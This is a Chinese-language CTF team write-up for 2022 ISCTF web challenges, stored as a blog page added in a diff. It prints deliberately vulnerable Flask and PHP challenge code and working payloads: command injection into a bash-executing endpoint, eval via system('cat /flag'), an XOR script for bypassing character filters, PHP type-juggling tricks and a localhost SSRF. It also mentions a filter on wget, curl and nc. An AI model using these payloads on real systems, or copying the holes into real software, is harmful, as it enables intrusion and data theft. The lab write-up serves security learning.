@@ -1,0 +1,392 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>2022ISCTF-C0T4N9战队WP | C4skg's blog</title><meta name="author" content="C4skg"><meta name="copyright" content="C4skg"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="article">
+<meta property="og:title" content="2022ISCTF-C0T4N9战队WP">
+<meta property="og:url" content="https://c4skg.top/C4skg/3a7ba136.html">
+<meta property="og:site_name" content="C4skg&#39;s blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://static.c4skg.top/c4skg/banner.jpg">
+<meta property="article:published_time" content="2022-11-06T15:18:23.000Z">
+<meta property="article:modified_time" content="2023-03-10T06:49:36.000Z">
+<meta property="article:author" content="C4skg">
+<meta property="article:tag" content="ISCTF">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://static.c4skg.top/c4skg/banner.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://c4skg.top/C4skg/3a7ba136.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: {"appId":"5FG3MYF8M4","apiKey":"aa348bf5265a6239b68963e9ef01934e","indexName":"Hexo","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2022ISCTF-C0T4N9战队WP',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-10 14:49:36'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = url => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      link.onload = () => resolve()
+      link.onerror = () => reject()
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/universe.css"><meta name="generator" content="Hexo 5.4.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://static.c4skg.top/c4skg/logo.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://static.c4skg.top/c4skg/banner.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="C4skg's blog"><img class="site-icon" src="https://static.c4skg.top/c4skg/name.png"/><span class="site-name">C4skg's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2022ISCTF-C0T4N9战队WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-06T15:18:23.000Z" title="发表于 2022-11-06 23:18:23">2022-11-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-10T06:49:36.000Z" title="更新于 2023-03-10 14:49:36">2023-03-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ISCTF/">ISCTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2022ISCTF-C0T4N9战队WP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>被师傅们打爆了呜呜呜</p>
+<p>总排名 <strong>32</strong></p>
+<p>社会赛道 <strong>17</strong></p>
+<img src="/C4skg/3a7ba136/score.png" class="">
+<p>​</p>
+<h2 id="题解">题解</h2>
+<h3 id="Web">Web</h3>
+<h4 id="eazy-onlineshell">eazy-onlineshell</h4>
+<p>打开靶机，根据提示，先来到 <code>/rce</code> 提示有备份，fuzz后，发现输入<code>www.zip</code>会输出代码，复制到vscode中，发现是 python的flask</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Try to access the /rce&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/www.zip&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">return_SourceCode</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./app.py&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/rce&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action_rce</span>():</span><br><span class="line">    <span class="keyword">if</span> flask.request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Why not try to search the backup&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> flask.request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        action = flask.request.form[<span class="string">&quot;act&quot;</span>]</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/app/temp.sh&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(action[<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line">        res = subprocess.run([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/app/temp.sh&quot;</span>], stdout=subprocess.PIPE)</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>简单审计后，可知我们在 /rce 下，可以通过POST请求，传入act变量来构造shell语句。此时python会执行命令，相当于 <code>/bin/bash 你输入的内容</code></p>
+<p>因为每次执行的 <code>/app/temp.sh</code>文件都会被覆盖。</p>
+<p>但是没有回显，只有 ‘success’</p>
+<p>猜测是反弹shell，但是均失败了。</p>
+<p>后来尝试将文件直接写入 <a target="_blank" rel="noopener" href="http://app.py">app.py</a> 文件，然后url访问 www.zip 居然可以得到结果</p>
+<p>应该是非预期解，师傅的环境估计配置错误了，当初还想了半天为什么不能反弹shell，连不上外面。</p>
+<p>那就很简单了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">构造：</span><br><span class="line">act=1ls&gt;app.py3</span><br><span class="line">然后访问 www.zip</span><br><span class="line">得到</span><br><span class="line">__pycache__ app.py flag temp.sh</span><br><span class="line"></span><br><span class="line">最后</span><br><span class="line">act=1cat flag&gt;app.py3</span><br></pre></td></tr></table></figure>
+<p><code>ISCTF&#123;575404b9-3f52-4e44-b2e8-0cb9dbdd417c&#125;</code></p>
+<h4 id="crazy-onlineshell">crazy-onlineshell</h4>
+<p>这题出来更加确定是非预期解了，参考上一个eazy-onlineshell的wp，代码就多了过滤了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget,curl,nc等命令</span><br></pre></td></tr></table></figure>
+<p>尝试上一题的方法，直接出flag，也属于非预期解</p>
+<p><code>ISCTF&#123;08f22376-8f6e-4dc8-84c9-41e571846103&#125;</code></p>
+<h4 id="EASY-PHP01">EASY-PHP01:</h4>
+<img src="/C4skg/3a7ba136/1.jpg" class="">
+<pre><code>F12看html代码
+</code></pre>
+<img src="/C4skg/3a7ba136/2.jpg" class="">
+<pre><code>构造paloyd: `120.79.18.34:20958/?hint`  得到源码
+</code></pre>
+<p>​</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./flag114514.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$ISCTF</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ISCTF</span> == <span class="number">114514</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ISCTF</span> === <span class="string">&quot;114514&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;好臭啊&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;= == === != !==&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;什么是POST？&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot; 什么是GET？&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>POST ：ISCTF=114514a`   得到flag</p>
+<img src="/C4skg/3a7ba136/3.jpg" class="">
+<h4 id="EASY-PHP02">EASY-PHP02</h4>
+<pre><code>传入POST参数  POST:GET1=!0&amp;GET2=679a   和  GET参数 NAME=123 得到 
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%u0065%u0039%u0032%u0031%u002d%u0039%u0032%u0033%u0066%u002d%u0034%u0061%u0031%u0061%u002d%u0061%u0037%u0064%u0062%u002d%u0031%u0065%u0065%u0066%u0034%u0065%u0064%u0061%u0035%u0066%u0039%u0065%u007d</span><br></pre></td></tr></table></figure>
+<pre><code>URL解码得到flag的下半部分  e921-923f-4a1a-a7db-1eef4eda5f9e&#125;
+
+GET传入?NAME=123&amp;P0ST1=0&amp;P0ST2=240610708  得到上半部分 49534354467b39363634   
+
+hex解密后得到ISCTF&#123;9664    flag=ISCTF&#123;9664e921-923f-4a1a-a7db-1eef4eda5f9e&#125;
+</code></pre>
+<h4 id="FakeWeb">FakeWeb</h4>
+<pre><code>curl 重定向
+
+&#123;% asset_img "4.jpg" "" %&#125;
+</code></pre>
+<h4 id="simplephp">simplephp</h4>
+<p>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$str=$_GET[&#x27;str&#x27;];</span><br><span class="line">$pattern = &quot;#\\\\\\\\/Ilikeisctf#&quot;;</span><br><span class="line">function filter($num)&#123;</span><br><span class="line">    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);</span><br><span class="line">    return $num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(preg_match($pattern,$str,$arr))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;good try!&quot;;</span><br><span class="line">    $num=$_GET[&#x27;num&#x27;];</span><br><span class="line">    if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;</span><br><span class="line">        echo &quot;come on!!!&quot;;</span><br><span class="line">        if($num==&#x27;36&#x27;&amp;isset($_GET[&#x27;cmd&#x27;]))&#123;</span><br><span class="line"></span><br><span class="line">                eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;hacker!!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;hacker!!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>传入?str=\\\\\\\\/Ilikeisctf  得到 good try
+
+%0c36绕过is_unmeric()和trim()  得到 come on
+
+最后paloyd str=\\\\\\\\/Ilikeisctf&amp;num=%0c36&amp;cmd=system('cat /flag');
+</code></pre>
+<img src="/C4skg/3a7ba136/5.jpg" class="">
+<h4 id="curl">curl</h4>
+<img src="/C4skg/3a7ba136/6.jpg" class="">
+<pre><code>url传入   ?urls=127.0.0.1/flag.php)  得到
+</code></pre>
+<img src="/C4skg/3a7ba136/7.jpg" class="">
+<h4 id="rce？">rce？</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$_GET[&#x27;shell&#x27;])) &#123;</span><br><span class="line">  $code = $_GET[&#x27;shell&#x27;];</span><br><span class="line">  var_dump(eval($code));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  </span><br><span class="line">echo &quot;你能拿到flag吗？&quot;;</span><br><span class="line">&#125; bool(false)</span><br></pre></td></tr></table></figure>
+<pre><code>通过异或脚本绕过
+</code></pre>
+<p>​</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line"><span class="keyword">from</span> sys import *</span><br><span class="line">import os</span><br><span class="line">def <span class="title function_ invoke__">action</span>(arg):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i in arg:</span><br><span class="line">       f=<span class="title function_ invoke__">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> True:</span><br><span class="line">           t=f.<span class="title function_ invoke__">readline</span>()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.<span class="title function_ invoke__">close</span>()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">   param=<span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+<span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="keyword">print</span>(param)</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入system 和 ls  /得到  (<span class="string">&quot;%0c%06%0c%0b%05%0d&quot;</span>^<span class="string">&quot;%7f%7f%7f%7f%60%60&quot;</span>)(<span class="string">&quot;%0c%0c%00%00&quot;</span>^<span class="string">&quot;%60%7f%20%2f&quot;</span>);</span><br><span class="line"></span><br><span class="line">输入system 和 cat flag 得到(<span class="string">&quot;%0c%06%0c%0b%05%0d&quot;</span>^<span class="string">&quot;%7f%7f%7f%7f%60%60&quot;</span>)(<span class="string">&quot;%03%01%0b%00%00%06%0c%01%07&quot;</span>^<span class="string">&quot;%60%60%7f%20%2f%60%60%60%60&quot;</span>);</span><br><span class="line"></span><br><span class="line">?shell=(<span class="string">&quot;%0c%06%0c%0b%05%0d&quot;</span>^<span class="string">&quot;%7f%7f%7f%7f%60%60&quot;</span>)(<span class="string">&quot;%03%01%0b%00%00%06%0c%01%07&quot;</span>^<span class="string">&quot;%60%60%7f%20%2f%60%60%60%60&quot;</span>);  </span><br></pre></td></tr></table></figure>
+<p>​	得到<img src="/C4skg/3a7ba136/8.jpg" class=""></p>
+<p>​</p>
+<h4 id="猫和老鼠">猫和老鼠</h4>
+<p>题目</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Good. You caught the mouse:&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;v);</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dog</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dog</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;I&#x27;m a vicious dog, Kitty&quot;</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cat&quot;</span>]); </span><br></pre></td></tr></table></figure>
+<pre><code>			构造反序列化
+</code></pre>
